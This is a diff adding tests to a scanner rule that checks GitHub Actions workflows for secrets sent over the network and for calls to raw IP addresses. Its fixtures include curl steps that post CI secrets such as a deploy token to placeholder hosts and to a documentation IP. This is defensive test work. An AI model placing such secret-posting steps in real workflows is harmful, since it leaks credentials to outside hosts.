@@ -33,4 +33,35 @@ describe('DOME-GHA-001', () => {
       'block:checksOutPrHead@.github/workflows/x.yml:8',
     ]);
   });
+
+  it('reviews, not blocks, one named secret sent over HTTPS to a named host', async () => {
+    const steps = '      - run: curl -s -d "token=${{ secrets.DEPLOY_TOKEN }}" https://deploy.example.invalid/hook\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['review:secretsToNetwork@.github/workflows/x.yml:6']);
+  });
+
+  it('reviews a secret that is itself the URL being called', async () => {
+    const steps = '      - run: curl -X POST -d {} "${{ secrets.BUILD_HOOK }}?branch=main"\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual(['review:secretsToNetwork@.github/workflows/x.yml:6']);
+    const data = '      - run: curl -X POST -d "${{ secrets.T }}"\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', data) })).toEqual(['block:secretsToNetwork@.github/workflows/x.yml:6']);
+  });
+
+  it('still blocks a named secret sent over plain HTTP or to a raw IP', async () => {
+    const http = '      - run: curl -d "${{ secrets.T }}" http://example.invalid/DOME_FIXTURE\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', http) })).toContain('block:secretsToNetwork@.github/workflows/x.yml:6');
+    const ip = '      - run: curl -d "${{ secrets.T }}" https://192.0.2.1/DOME_FIXTURE\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', ip) })).toContain('block:secretsToNetwork@.github/workflows/x.yml:6');
+  });
+
+  it('ignores loopback and private addresses but not public ones after them', async () => {
+    const local = '      - run: curl http://127.0.0.1:7690/ping http://172.30.0.30:10000 http://192.168.1.5/x http://10.0.0.1/\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', local) })).toEqual([]);
+    const mixed = '      - run: curl http://127.0.0.1/ping http://192.0.2.7/DOME_FIXTURE\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', mixed) })).toEqual(['block:rawIp@.github/workflows/x.yml:6']);
+  });
+
+  it('does not mistake a hostname that starts with digits for an address', async () => {
+    const steps = '      - run: curl http://1.2.3.4.example.invalid/x\n';
+    expect(await runRule(rule, { '.github/workflows/x.yml': wf('push', steps) })).toEqual([]);
+  });
 });
